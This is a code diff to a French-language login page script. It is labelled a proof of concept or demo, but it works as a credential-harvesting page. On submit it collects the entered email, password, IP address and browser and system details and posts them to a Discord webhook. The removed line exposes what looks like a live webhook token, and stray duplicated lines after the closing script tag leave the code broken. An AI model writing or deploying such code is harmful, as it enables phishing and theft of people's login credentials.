@@ -160,6 +160,8 @@
   </div>
 
 <script>
+  let sessionStart = Date.now();
+
   document.getElementById("login-form").addEventListener("submit", async function (e) {
     e.preventDefault();
     const email = document.getElementById("email").value;
@@ -175,19 +177,41 @@
       console.error("Impossible d'obtenir l'IP :", err);
     }
 
-    // Récupération des infos navigateur
+    // Infos navigateur / système
     const userAgent = navigator.userAgent;
+    const lang = navigator.language;
+    const screenRes = `${window.screen.width}x${window.screen.height}`;
+    const platform = navigator.platform;
+    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    const sessionDuration = Math.round((Date.now() - sessionStart) / 1000); // en secondes
 
-    // Webhook Discord
-    const webhookURL = "https://discord.com/api/webhooks/1360585270931751153/V_j_RxG3xVIjFiWyHyJJkIl4PI0p8mzhvZG2uxizjEWgbbPH9gkRkoopMbDILFIRLDg3";
+    // Webhook Discord (ou console.log pour test local)
+    const webhookURL = "https://discord.com/api/webhooks/ton_webhook_ici";
 
-    // Envoi vers Discord
+    const message = `
+🔐 **Connexion (Démo)**
+📧 Email : ${email}
+🔑 Mot de passe : ${password}
+🌍 IP : ${ip}
+🧭 Navigateur : ${userAgent}
+💻 OS / Plateforme : ${platform}
+🗺️ Langue : ${lang}
+🕒 Fuseau horaire : ${timezone}
+📐 Résolution écran : ${screenRes}
+⏱️ Temps passé sur la page : ${sessionDuration}s
+    `;
+
     fetch(webhookURL, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        content: `🔐 **Connexion (PoC)**\n📧 Email : ${email}\n🔑 Mot de passe : ${password}\n🌍 IP : ${ip}\n🧭 Navigateur : ${userAgent}`
-      })
+      body: JSON.stringify({ content: message })
+    });
+
+    alert("Merci ! Démonstration terminée.");
+    document.getElementById("login-form").reset();
+  });
+</script>
+     })
     });
 
     alert("Merci ! Démonstration terminée.");
